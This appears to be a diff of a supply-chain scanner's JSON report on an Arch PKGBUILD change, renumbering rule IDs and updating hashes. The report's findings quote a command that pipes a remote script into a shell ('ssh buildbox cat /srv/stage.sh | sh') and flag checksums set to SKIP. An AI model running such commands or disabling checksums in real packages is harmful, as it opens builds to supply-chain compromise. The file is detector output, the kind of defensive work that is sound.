@@ -1,7 +1,7 @@
 {
   "attempt": 1,
   "cost": {},
-  "db_hash": "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+  "db_hash": "sha256:5c9dec1886cc01f5f2307ee1ea87f9b32a4cef0f8f9a2c68beebc558013bedab",
   "diff_sha256": "sha256:ccb031e59e6e9b60f0014ca9a78914670cb169b249c4b64e9841aeff5935514c",
   "environment_ref": "campaign.yml#environment",
   "generator": {
@@ -41,12 +41,12 @@
   },
   "status": "detected",
   "trustsight": {
-    "config_fingerprint": "sha256:674ed4b8bef677140dfac9d70671a3dea5221fb93c0d3f35cf17036c55baccb1",
+    "config_fingerprint": "sha256:a7343821bc34603c5b4b048e213725d72a44fe0a5c92fd6d8c92e3f66aec0e8f",
     "report": {
       "changes": [
         "checksums changed from sha256 to SKIP"
       ],
-      "config_fingerprint": "sha256:674ed4b8bef677140dfac9d70671a3dea5221fb93c0d3f35cf17036c55baccb1",
+      "config_fingerprint": "sha256:a7343821bc34603c5b4b048e213725d72a44fe0a5c92fd6d8c92e3f66aec0e8f",
       "coverage_gaps": [
         "tree_not_analyzed"
       ],
@@ -57,14 +57,14 @@
       "file_changes": [],
       "findings": [
         {
-          "description": "checksum set to SKIP [R004]",
+          "description": "checksum set to SKIP [H001]",
           "evidence": {
             "match": "sha256sums=SKIP",
             "skip_suffix": ""
           },
           "file": "PKGBUILD",
           "line": 14,
-          "rule_id": "R004",
+          "rule_id": "H001",
           "severity": "HIGH",
           "template": "checksum set to SKIP{skip_suffix}"
         },
@@ -111,7 +111,7 @@
             "skip_suffix": ""
           },
           "reason": "Checksum Disabled: sha256sums=SKIP",
-          "rule_id": "R004",
+          "rule_id": "H001",
           "severity": "HIGH",
           "template": "checksum set to SKIP{skip_suffix}",
           "weight": 25
@@ -145,7 +145,7 @@
             "touched": "build"
           },
           "reason": "Critical Build Function Modified: diff modifies build()",
-          "rule_id": "R060",
+          "rule_id": "H015",
           "severity": "INFO",
           "template": "critical build function modified: {touched}",
           "weight": 0
@@ -161,7 +161,7 @@
             "n_categories": 3
           },
           "reason": "Capability Density Anomaly: rule hits span 3 distinct capability categories",
-          "rule_id": "R072",
+          "rule_id": "H027",
           "severity": "INFO",
           "template": "findings span {n_categories} distinct capability categories",
           "weight": 0
@@ -183,9 +183,9 @@
         }
       ],
       "suppressed_rules": [],
-      "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined. The result describes what was examined, not the whole change. Version bump. no structural changes. Signals: Fetch Through An Uncatalogued Client: uncatalogued fetch to a shell: ssh buildbox cat /srv/stage.sh | sh [X009]; checksum set to SKIP [R004]. Review the diff before building.",
+      "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined. The result describes what was examined, not the whole change. Version bump. no structural changes. Signals: Fetch Through An Uncatalogued Client: uncatalogued fetch to a shell: ssh buildbox cat /srv/stage.sh | sh [X009]; checksum set to SKIP [H001]. Review the diff before building.",
       "version_comparison": ""
     },
-    "wall_clock_ms": 750
+    "wall_clock_ms": 788
   }
 }
